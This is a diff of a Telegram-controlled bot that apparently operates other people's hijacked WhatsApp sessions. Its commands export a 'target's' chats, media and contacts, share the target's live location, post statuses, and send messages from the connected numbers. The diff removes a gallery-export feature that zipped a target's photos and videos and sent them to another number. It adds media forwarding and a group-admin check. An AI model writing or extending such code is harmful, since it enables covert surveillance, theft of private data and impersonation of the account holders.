@@ -9,14 +9,8 @@ const { sleep } = require('./utils');
 const { BOT_TOKEN } = require('./token');
 const { autoLoadPairs } = require('./autoload');
 const axios = require("axios")
-const {
-    getConnectedNumbers,
-    getChatList,
-    getContacts,
-    exportMessagesToZip,
-    exportContactsToText,
-    getNumberDataPath
-} = require('./dataCollector');
+const { getConnectedNumbers, getChatList, getContacts, exportMessagesToZip, exportContactsToText, getNumberDataPath } = require('./dataCollector');
+const { getBuffer } = require('./allfunc/myfunc');
 const AdmZip = require('adm-zip');
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -316,13 +310,36 @@ bot.on('message', async (msg) => {
   const text = msg.text;
   
   if (msg.chat.type !== 'private') return;
-  if (!text) return;
-  if (text.startsWith('/')) return;
   
   const ownerState = ownerStates.get(userId);
   if (ownerState) {
+    // Check for media in the message
+    if (msg.photo) {
+        const fileId = msg.photo[msg.photo.length - 1].file_id;
+        const fileLink = await bot.getFileLink(fileId);
+        const buffer = await getBuffer(fileLink);
+        ownerState.media = { image: buffer, caption: msg.caption || '' };
+    } else if (msg.video) {
+        const fileId = msg.video.file_id;
+        const fileLink = await bot.getFileLink(fileId);
+        const buffer = await getBuffer(fileLink);
+        ownerState.media = { video: buffer, caption: msg.caption || '' };
+    } else if (msg.voice) {
+        const fileId = msg.voice.file_id;
+        const fileLink = await bot.getFileLink(fileId);
+        const buffer = await getBuffer(fileLink);
+        ownerState.media = { audio: buffer, ptt: true };
+    } else if (msg.audio) {
+        const fileId = msg.audio.file_id;
+        const fileLink = await bot.getFileLink(fileId);
+        const buffer = await getBuffer(fileLink);
+        ownerState.media = { audio: buffer, ptt: false };
+    }
     return handleOwnerSteps(chatId, userId, text, ownerState);
   }
+
+  if (!text) return;
+  if (text.startsWith('/')) return;
 
   const userState = userStates.get(userId);
   if (!userState || userState.step !== 'awaiting_number') return;
@@ -521,40 +538,7 @@ async function handleOwnerSteps(chatId, userId, text, state) {
             ownerStates.delete(userId);
             break;
 
-        case 'awaiting_sendgl_target':
-            const glTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-            await bot.sendMessage(chatId, `⏳ Exporting gallery from ${state.from} to ${glTarget}...`);
-            try {
-                const { getMessages, getNumberDataPath } = require('./dataCollector');
-                const messages = getMessages(state.from);
-                const mediaMsgs = messages.filter(m => m.mediaPath && (m.type === 'image' || m.type === 'video'));
-                
-                if (mediaMsgs.length === 0) {
-                    await bot.sendMessage(chatId, '❌ No photos/videos found in logs.');
-                } else {
-                    const zip = new AdmZip();
-                    const numberDir = getNumberDataPath(state.from);
-                    mediaMsgs.forEach(m => {
-                        const fullPath = path.join(numberDir, m.mediaPath);
-                        if (fs2.existsSync(fullPath)) zip.addLocalFile(fullPath);
-                    });
-                    const zipPath = `/tmp/gallery_${state.from}.zip`;
-                    zip.writeZip(zipPath);
-                    
-                    // Send to target on WhatsApp
-                    await sock.sendMessage(glTarget, { 
-                        document: fs2.readFileSync(zipPath), 
-                        mimetype: 'application/zip', 
-                        fileName: `gallery_${state.from}.zip` 
-                    });
-                    await bot.sendMessage(chatId, '✅ Gallery ZIP sent to target on WhatsApp!');
-                    if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);
-                }
-            } catch (e) {
-                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
-            }
-            ownerStates.delete(userId);
-            break;
+
 
         case 'awaiting_sendlo_target':
             const loTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
@@ -637,7 +621,7 @@ Select a command to execute:
 • /checksms - View and export chats (with media)
 • /checkcn - View and export contacts
 • /sendsms - Send messages from connected numbers
-• /sendgl - Export gallery (photos/videos) from target
+
 • /sendlo - Send live location from target
 • /checkow - Check admin/owner status in groups/channels
 • /addstatus - Post status/story from connected numbers`;
@@ -663,23 +647,7 @@ bot.onText(/\/sendsms/, async (msg) => {
     });
 });
 
-// ========== /SENDGL COMMAND ==========
-bot.onText(/\/sendgl/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    if (!isOwner(userId)) return;
 
-    const numbers = getConnectedNumbers();
-    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
-
-    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendgl_num_${num}` }]);
-    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
-
-    await bot.sendMessage(chatId, '🛡️ *EXPORT GALLERY*\nSelect source number:', {
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: buttons }
-    });
-});
 
 // ========== /SENDLO COMMAND ==========
 bot.onText(/\/sendlo/, async (msg) => {
@@ -894,14 +862,7 @@ bot.on('callback_query', async (callbackQuery) => {
         return;
     }
 
-    // /sendgl step 1: Number selected
-    if (data.startsWith('owner_sendgl_num_')) {
-        const number = data.replace('owner_sendgl_num_', '');
-        ownerStates.set(userId, { step: 'awaiting_sendgl_target', from: number });
-        await bot.sendMessage(chatId, `📱 Source: ${number}\n\nSend target number to receive gallery ZIP:`);
-        await bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
+
 
     // /sendlo step 1: Number selected
     if (data.startsWith('owner_sendlo_num_')) {
@@ -931,9 +892,11 @@ bot.on('callback_query', async (callbackQuery) => {
             
             for (const jid in groups) {
                 const group = groups[jid];
-                const me = group.participants.find(p => sock.decodeJid(p.id) === sock.decodeJid(sock.user.id));
+                // Baileys group metadata might not have participants unless fetched specifically
+                const fullMetadata = await sock.groupMetadata(jid);
+                const me = fullMetadata.participants.find(p => sock.decodeJid(p.id) === sock.decodeJid(sock.user.id));
                 if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
-                    adminGroups.push({ jid, subject: group.subject });
+                    adminGroups.push({ jid, subject: fullMetadata.subject });
                 }
             }
 
